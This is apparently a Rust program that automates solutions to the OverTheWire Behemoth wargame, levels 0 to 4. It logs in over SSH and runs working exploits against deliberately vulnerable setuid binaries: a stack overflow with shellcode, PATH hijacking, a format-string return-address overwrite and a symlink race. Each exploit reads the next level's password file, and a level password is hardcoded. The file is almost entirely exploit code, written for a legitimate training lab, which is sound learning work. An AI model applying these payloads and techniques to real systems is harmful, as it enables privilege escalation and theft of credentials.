use std::{io::{Read, Write}, net::TcpStream};

use ssh2::*;
use anyhow::Result;

const HOST: &str = "behemoth.labs.overthewire.org";
const PORT: usize = 2221;

fn main() -> Result<()> {

    // let pass_1 = behemoth0("behemoth0")?;
    // let pass_2 = behemoth1(&pass_1)?;
    //let pass_3 = behemoth2(&pass_2)?;
    //let pass_4 = behemoth3(&pass_3)?;
    let _pass_5 = behemoth4("kCr7E3fqaP")?;

    Ok(())
}

fn ssh_session(username: &str, password: &str) -> Result<Session> {
    println!("connecting to server with username '{username}' and password '{password}'");

    let tcp = TcpStream::connect(format!("{HOST}:{PORT}"))?;
    let mut session = Session::new()?;
    session.set_tcp_stream(tcp);
    session.handshake()?;

    session.userauth_password(username, password)?;
    println!("connected successfully");
    Ok(session)
}

fn create_shell(channel: &mut Channel) -> Result<()> {
    channel.request_pty("xterm", None, Some((80, 24, 0, 0)))?;
    channel.shell()?;
    Ok(())
}

fn read_until(channel: &mut Channel, finished_token: &str) -> Result<String> {
    let mut result = String::new();
    let token_hex = hex::encode(finished_token);
    while !result.contains(&token_hex) {

        let mut full_buf = Vec::new();
        let mut buf = [0u8; 1024];

        loop {
            let amount_read = channel.read(&mut buf)?;
            full_buf.extend_from_slice(&buf[0..amount_read]);
            if amount_read < buf.len() {
                break;
            }
        }

        result += &hex::encode(&full_buf);
    }
    let raw = hex::decode(result).unwrap();
    let decoded = String::from_utf8_lossy(&raw);
    Ok(decoded.into())
}

fn write_line(channel: &mut Channel, line: &str) -> Result<()> {
    channel.write(format!("{line}\n").as_bytes())?;
    channel.flush()?;
    Ok(())
}

fn hex_literal(bytes: &[u8]) -> String {
    let mut encoded = String::new();
    for b in bytes {
        encoded += &format!("\\x{:02x?}", b);
    }
    encoded
}

fn behemoth0(password: &str) -> Result<String> {
    // for behemoth 0, the password to the binary can be found by looking for strcmp in an ltrace
    // upon submitting the real password, it will open a shell

    let session = ssh_session("behemoth0", password)?;

    let mut channel = session.channel_session()?;
    create_shell(&mut channel)?;

    read_until(&mut channel, "behemoth0@gibson:~$ ")?;

    let test_pass = "test";

    let test_cmd = format!("echo {test_pass} | ltrace /behemoth/behemoth0 2>&1");
    println!("running '{test_cmd}'");
    write_line(&mut channel, &test_cmd)?;

    let result = read_until(&mut channel, "behemoth0@gibson:~$ ")?;
    let result = result.split("\n").skip(1).find(|s| s.contains(test_pass)).unwrap();
    println!("{result}");

    let real_pass = result.split("\"").nth(3).unwrap(); // strcmp("my_pass", "real_pass")
    println!("real pass is '{real_pass}'");

    let real_cmd = "/behemoth/behemoth0";
    println!("running '{real_cmd}' to spawn suid shell");
    write_line(&mut channel, &real_cmd)?;
    
    read_until(&mut channel, "Password: ")?;
    write_line(&mut channel, &real_pass)?;
    read_until(&mut channel, "$ ")?;

    println!("retrieving /etc/behemoth_pass/behemoth1");
    write_line(&mut channel, "cat /etc/behemoth_pass/behemoth1")?;

    let result = read_until(&mut channel, "$ ")?;
    let result = result.split("\n").nth(1).unwrap().trim();
    println!("retrieved behemoth1 pass '{result}'\n");

    Ok(result.to_string())
}

fn behemoth1(password: &str) -> Result<String> {
    // behemoth1 is a basic stack overflow. however updates to the box (linux version, libc etc) prevent some old methods from working
    // the stack is executable: approach is fill it with nops, end with a short jump, then the overflow ret register, then shell code,
    // so execution will be hit overflow, jump back to beginning of variable stack, follow nops, jump over overflow and start shell code.
    // shellcode used just reads the target file, and is sourced from here: https://shell-storm.org/shellcode/files/shellcode-73.html

    let session = ssh_session("behemoth1", password)?;

    let mut channel = session.channel_session()?;
    create_shell(&mut channel)?;

    read_until(&mut channel, "behemoth1@gibson:~$ ")?;

    let nop_sled: Vec<u8> = vec![0x90; 69]; // the offset is 71 to the ret address. 71 - length of jmp is 69 (nice)
    let jmp_esp = hex::decode("eb04")?; // jmp 6 (4 + length of instruction, eb 04), used to jump over the next four bytes below
    let var_adr = hex::decode("01d5ffff")?; // 0xffffd501, approximate location in nop sled
    let file_read_shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF").unwrap(); // https://shell-storm.org/shellcode/files/shellcode-73.html
    let file_to_read = "/etc/behemoth_pass/behemoth2".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here

    let mut full_payload: Vec<u8> = Vec::new();
    full_payload.extend(nop_sled);
    full_payload.extend(jmp_esp);
    full_payload.extend(var_adr);
    full_payload.extend(file_read_shellcode);
    full_payload.extend(file_to_read);

    let encoded = hex_literal(&full_payload);

    let target = "/behemoth/behemoth1";
    println!("running 'echo -e [payload] | {target}'");

    let cmd = format!("echo -e \"{encoded}\" | {target}");
    write_line(&mut channel, &cmd)?;
    
    println!("reading result");

    let result = read_until(&mut channel, "behemoth1@gibson:~$ ")?;
    let result: Vec<&str> = result.split("\n").collect();
    let result = result[result.len()-2].trim();
    println!("retrieved behemoth2 pass '{result}'\n");

    Ok(result.to_string())
}

fn behemoth2(password: &str) -> Result<String> {
    // behemoth2 calls 'touch' unqualified to create a file with the name of its PID. it then waits two seconds before executing the file's contents
    // while this could be exploited by perhaps writing some command into the file (once the pid is determined), it is simpler to hijack touch via path injection

    let session = ssh_session("behemoth2", password)?;

    let mut channel = session.channel_session()?;
    create_shell(&mut channel)?;

    read_until(&mut channel, "behemoth2@gibson:~$ ")?;

    println!("creating a writable tmp folder and moving to it");
    write_line(&mut channel, "cd $(mktemp -d) && chmod 777 $(pwd)")?;
    read_until(&mut channel, "$ ")?;

    let exploit = "echo \"/bin/sh\" > touch && chmod +x touch && PATH=. /behemoth/behemoth2";
    println!("running '{exploit}' to get a suid shell");
    write_line(&mut channel, &exploit)?;
    read_until(&mut channel, "$ ")?;

    println!("reading password");
    write_line(&mut channel, "/bin/cat /etc/behemoth_pass/behemoth3")?; // note because we murdered PATH, we need to use the qualified path to 'cat' to call it
    let result = read_until(&mut channel, "$ ")?;
    let result: Vec<&str> = result.split("\n").collect();
    let result = result[result.len()-2].trim();
    
    println!("retrieved behemoth3 pass '{result}'\n");

    Ok(result.to_string())
}

fn behemoth3(password: &str) -> Result<String> {
    // behemoth3 is a fairly simple format string exploit, calling gets on a 200 len buffer and then printing the result:
    // main() {
    //     char local_cc [200];
    //     printf("Identify yourself: ");
    //     fgets(local_cc,200,stdin);
    //     printf("Welcome, ");
    //     printf(local_cc);
    //     puts("\naaaand goodbye again.");
    //     return 0;
    // }
    // [*] '/behemoth/behemoth3'
    // Arch:     i386-32-little
    // RELRO:    No RELRO
    // Stack:    No canary found
    // NX:       NX unknown - GNU_STACK missing
    // PIE:      No PIE (0x8048000)
    // Stack:    Executable
    // RWX:      Has RWX segments
    //
    // just need to overwrite the ret address (or somewhere in the got) with the stack address to run shellcode
    // idea will be nops + shellcode + padded value + target for lower bytes, padded value + target for higher bytes

    let ret_addr1 = hex::decode("3cd5ffff")?; // 0xffffd52c, found by breaking at ret from main and then p $sp. had to tweak by 16 byte diffs to find the correct value remote
    let ret_addr2 = hex::decode("3ed5ffff")?; // two bytes up to write the higher bytes of the address
    
    // 0xffffd584, approximate location in nop sled. want to set ret to this
    let lower_two = "%1$54395x %1$n".as_bytes(); // print some ridiculous number of spaces, followed by an 'n'. this will write the total amount so far (d584) to the address at n's position, beginning of stack
    let upper_two = "%1$76666x %2$n".as_bytes(); // this again, minus the spaces so far, to try and get the upper four bytes to ffff

    let nop_sled: Vec<u8> = vec![0x90; 40]; 
    let file_read_shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF").unwrap(); // https://shell-storm.org/shellcode/files/shellcode-73.html
    let file_to_read = "/etc/behemoth_pass/behemoth4".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here
    
    let mut full_payload: Vec<u8> = Vec::new();
    full_payload.extend(ret_addr1);
    full_payload.extend(ret_addr2);
    full_payload.extend(lower_two);
    full_payload.extend(upper_two);
    full_payload.extend(nop_sled);
    full_payload.extend(file_read_shellcode);
    full_payload.extend(file_to_read);

    let encoded = hex_literal(&full_payload);
    println!("{encoded}");

    let session = ssh_session("behemoth3", password)?;
    let mut channel = session.channel_session()?;
    create_shell(&mut channel)?;

    read_until(&mut channel, "behemoth3@gibson:~$ ")?;
    
    let target = "/behemoth/behemoth3";
    println!("running 'echo -en [payload] | {target}'");

    let cmd = format!("echo -en \"{encoded}\" | {target}");
    write_line(&mut channel, &cmd)?;
    
    println!("reading result");

    let result = read_until(&mut channel, "behemoth3@gibson:~$ ")?;
    let result: Vec<&str> = result.split("\n").collect();
    let result = result[result.len()-2].trim();
    println!("retrieved behemoth4 pass '{result}'\n");

    Ok(result.to_string())
}

fn behemoth4(password: &str) -> Result<String> {
    // behemoth4 attempts to read a file in tmp with the name of its pid
    // the code from ghidra is a bit like:
    //   _Var1 = getpid();
    //   sprintf(local_28,"/tmp/%d",_Var1);
    //   __stream = fopen(local_28,"r");
    //   if (__stream == (FILE *)0x0) {
    //       puts("PID not found!");
    //   }
    //   else {
    //       sleep(1);
    //       puts("Finished sleeping, fgetcing");
    //       while( true ) {
    //       __c = fgetc(__stream);
    //       if (__c == -1) break;
    //       putchar(__c);
    //       }
    //       fclose(__stream);
    //   }
    // technique is to start the process, get its pid, and in parellel create a link to the next password file to be read
    
    let session = ssh_session("behemoth4", password)?;
    let mut channel = session.channel_session()?;
    create_shell(&mut channel)?;

    read_until(&mut channel, "behemoth4@gibson:~$ ")?;

    println!("starting process in parallel and then pausing");
    write_line(&mut channel, "/behemoth/behemoth4&")?;
    write_line(&mut channel, "PID=$!")?;
    write_line(&mut channel, "kill -STOP $PID")?;

    println!("creating symlink and then restarting");
    write_line(&mut channel, "ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID")?;
    write_line(&mut channel, "kill -CONT $PID")?;
    
    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
    read_until(&mut channel, "behemoth4@gibson:~$ ")?;
    let result = read_until(&mut channel, "behemoth4@gibson:~$ ")?;
    // let result: Vec<&str> = result.split("\n").collect();
    // let result = result[result.len()-2].trim();
    println!("retrieved behemoth5 pass '{result}'\n");

    Ok("result".to_string())
}